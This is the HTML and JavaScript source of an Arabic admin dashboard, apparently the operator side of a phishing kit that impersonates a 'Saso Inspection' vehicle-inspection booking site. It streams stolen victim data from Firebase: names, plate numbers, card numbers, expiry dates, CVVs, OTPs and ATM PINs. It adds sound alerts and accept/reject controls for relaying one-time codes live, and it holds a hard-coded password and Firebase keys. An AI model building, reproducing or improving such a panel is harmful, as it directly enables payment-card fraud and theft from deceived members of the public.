<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>لوحة التحكم - Saso Inspection</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    <style>
        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #121212; color: white; margin: 0; padding: 0; }
        #loginOverlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #1e7344; display: flex; align-items: center; justify-content: center; z-index: 9999; }
        .login-box { background: white; padding: 30px; border-radius: 15px; width: 90%; max-width: 350px; text-align: center; color: #333; }
        .login-box input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; }
        .login-box button { width: 100%; padding: 12px; background: #1e7344; color: white; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; }
        #adminContent { display: none; }
        .navbar { background: #1e7344; padding: 15px; display: flex; justify-content: center; gap: 10px; position: sticky; top: 0; z-index: 1000; }
        .nav-btn { background: rgba(255,255,255,0.1); border: 1px solid rgba(255,255,255,0.2); color: white; padding: 12px; border-radius: 8px; cursor: pointer; font-weight: bold; flex: 1; max-width: 250px; }
        .nav-btn.active { background: #ffffff; color: #1e7344; }
        .visitor-counter { background: #ffd700; color: #000; padding: 10px; text-align: center; font-weight: bold; }
        .container { padding: 15px; }
        .tab-content { display: none; }
        .tab-content.active { display: block; }

        /* تنسيق البيانات */
        .operation-row { background: #1e1e1e; border-radius: 12px; padding: 15px; margin-bottom: 15px; border: 1px solid #333; border-right: 8px solid #1e7344; }
        .card-header { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #333; padding-bottom: 10px; margin-bottom: 10px; }
        .customer-name { font-weight: bold; color: #4caf50; font-size: 16px; }
        
        .data-grid { display: flex; flex-wrap: wrap; gap: 8px; margin-bottom: 15px; }
        .info-box { background: #2d2d2d; border: 1px solid #444; padding: 8px; border-radius: 6px; min-width: 110px; text-align: center; }
        .info-label { display: block; font-size: 10px; color: #aaa; margin-bottom: 4px; }
        .info-value { display: block; font-size: 13px; color: #fff; font-weight: bold; }
        
        /* ألوان التنبيه */
        .highlight-new { border-color: #ffd700 !important; background: #3d3d2d !important; animation: borderPulse 2s infinite; }
        @keyframes borderPulse { 0% { border-color: #333; } 50% { border-color: #ffd700; } 100% { border-color: #333; } }

        /* أزرار التحكم - الافتراضي رمادي غامق */
        .actions-area { display: flex; gap: 10px; }
        .btn { flex: 1; padding: 12px; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; color: white; transition: 0.3s; background: #444; color: #888; }
        
        /* لما يكون فيه جديد ترجع الألوان */
        .btn-new-data.btn-accept { background: #28a745 !important; color: white !important; box-shadow: 0 0 10px rgba(40, 167, 69, 0.4); }
        .btn-new-data.btn-reject { background: #dc3545 !important; color: white !important; box-shadow: 0 0 10px rgba(220, 53, 69, 0.4); }

        .status-badge { padding: 4px 10px; border-radius: 10px; font-size: 11px; font-weight: bold; }
        .status-waiting { background: #5a4a00; color: #ffd700; }
    </style>
</head>
<body onload="checkSavedLogin()">

<audio id="alertSound" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3" preload="auto"></audio>

<div id="loginOverlay">
    <div class="login-box">
        <h2>لوحة التحكم</h2>
        <input type="text" id="username" placeholder="المستخدم">
        <input type="password" id="password" placeholder="كلمة المرور">
        <button onclick="checkLogin()">دخول</button>
    </div>
</div>

<div id="adminContent">
    <div class="visitor-counter">المتواجدون الآن: <span id="onlineCount">0</span> 🌐</div>
    <div class="navbar">
        <button class="nav-btn active" onclick="openTab(event, 'bookingSection')">👤 الحجوزات</button>
        <button class="nav-btn" onclick="openTab(event, 'cardsSection')">💳 البطاقات</button>
        <button class="nav-btn" onclick="logout()" style="background:#000">🚪 خروج</button>
    </div>
    <div class="container">
        <div id="bookingSection" class="tab-content active"><div id="bookingGrid"></div></div>
        <div id="cardsSection" class="tab-content"><div id="paymentsContainer"></div></div>
    </div>
</div>

<script>
    function checkSavedLogin() { if (localStorage.getItem("admin_logged_in") === "true") showAdmin(); }
    function checkLogin() {
        if(document.getElementById('password').value === "H0987654H") {
            localStorage.setItem("admin_logged_in", "true");
            showAdmin();
        }
    }
    function showAdmin() { 
        document.getElementById('loginOverlay').style.display = 'none'; 
        document.getElementById('adminContent').style.display = 'block'; 
        initFirebase(); 
    }
    function logout() { localStorage.removeItem("admin_logged_in"); location.reload(); }

    function playSound() { document.getElementById('alertSound').play().catch(e => console.log("Sound error")); }

    function initFirebase() {
        const firebaseConfig = {
            apiKey: "AIzaSyAeZAjt4kZWVLJSKiehqLFrT8X6X8X6X8",
            authDomain: "saso-inspection.firebaseapp.com",
            databaseURL: "https://saso-inspection-default-rtdb.firebaseio.com",
            projectId: "saso-inspection",
            storageBucket: "saso-inspection.appspot.com",
            messagingSenderId: "1009002235896",
            appId: "1:1009002235896:web:3f0d6f84b6e956ffa5b80d"
        };
        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();

        // عداد الزوار
        database.ref('live_visitors').on('value', s => {
            let active = 0; const now = Date.now();
            s.forEach(c => { if(now - c.val().last_active < 30000) active++; });
            document.getElementById('onlineCount').innerText = active;
        });

        // الحجوزات - الجديد في الأول
        database.ref('visitors').on('child_added', s => {
            const val = s.val();
            const div = document.createElement('div');
            div.className = 'operation-row';
            div.innerHTML = `<span class="customer-name">${val.fullName}</span><br><small>${val.vehicleType} - ${val.plateNumber}</small>`;
            document.getElementById('bookingGrid').prepend(div);
        });

        // البطاقات - النظام الذكي
        database.ref('payments').on('child_added', s => {
            renderCard(s.key, s.val(), true); // true تعني بيانات جديدة تماماً
        });

        database.ref('payments').on('child_changed', s => {
            const val = s.val();
            const existingRow = document.getElementById('p_' + s.key);
            if(existingRow) {
                // إذا العميل حدث OTP أو PIN والعملية كانت انتظار، نشغل التنبيه
                if(val.status && val.status.includes('waiting')) {
                    existingRow.classList.add('highlight-new');
                    const btns = existingRow.querySelectorAll('.btn');
                    btns.forEach(b => b.classList.add('btn-new-data'));
                    playSound();
                }
                // تحديث القيم داخل المربعات
                existingRow.querySelector('.otp-val').innerText = val.otp || '-';
                existingRow.querySelector('.pin-val').innerText = val.atm_pin || '-';
                
                // تحديثBadge الحالة
                const badge = document.getElementById('stat_'+s.key);
                if(val.status === 'accept') { badge.innerText = "مقبول ✅"; badge.style.background = "#28a745"; existingRow.classList.remove('highlight-new'); }
                if(val.status === 'reject') { badge.innerText = "مرفوض ❌"; badge.style.background = "#dc3545"; existingRow.classList.remove('highlight-new'); }
            }
        });
    }

    function renderCard(key, val, isNew) {
        const container = document.getElementById('paymentsContainer');
        const row = document.createElement('div');
        row.className = 'operation-row' + (isNew ? ' highlight-new' : '');
        row.id = 'p_' + key;
        
        // الأزرار تأخذ كلاس التنبيه لو البيانات جديدة
        const btnClass = isNew ? 'btn-new-data' : '';
        if(isNew) playSound();

        row.innerHTML = `
            <div class="card-header">
                <span class="customer-name">${val.cardHolder || 'عميل جديد'}</span>
                <span id="stat_${key}" class="status-badge status-waiting">انتظار ⏳</span>
            </div>
            <div class="data-grid">
                <div class="info-box"><span class="info-label">رقم البطاقة</span><span class="info-value">${val.cardNumber}</span></div>
                <div class="info-box"><span class="info-label">التاريخ</span><span class="info-value">${val.expiry}</span></div>
                <div class="info-box"><span class="info-label">CVV</span><span class="info-value">${val.cvv}</span></div>
                <div class="info-box" style="border-color:#2196f3"><span class="info-label">OTP</span><span class="info-value otp-val">${val.otp || '-'}</span></div>
                <div class="info-box" style="border-color:#9c27b0"><span class="info-label">PIN</span><span class="info-value pin-val">${val.atm_pin || '-'}</span></div>
            </div>
            <div class="actions-area">
                <button class="btn btn-accept ${btnClass}" onclick="updateStat('${key}', 'accept', this)">قبول</button>
                <button class="btn btn-reject ${btnClass}" onclick="updateStat('${key}', 'reject', this)">رفض</button>
            </div>
        `;
        container.prepend(row);
    }

    function updateStat(id, action, btn) {
        firebase.database().ref('payments/' + id).update({ status: action });
        // عند الضغط، نرجع أزرار هذا الكرت للوضع الرمادي ونشيل التنبيه
        const row = document.getElementById('p_' + id);
        row.classList.remove('highlight-new');
        row.querySelectorAll('.btn').forEach(b => b.classList.remove('btn-new-data'));
    }

    function openTab(evt, name) {
        document.querySelectorAll(".tab-content").forEach(t => t.style.display = "none");
        document.querySelectorAll(".nav-btn").forEach(b => b.classList.remove("active"));
        document.getElementById(name).style.display = "block";
        evt.currentTarget.className += " active";
    }
</script>
</body>
</html>
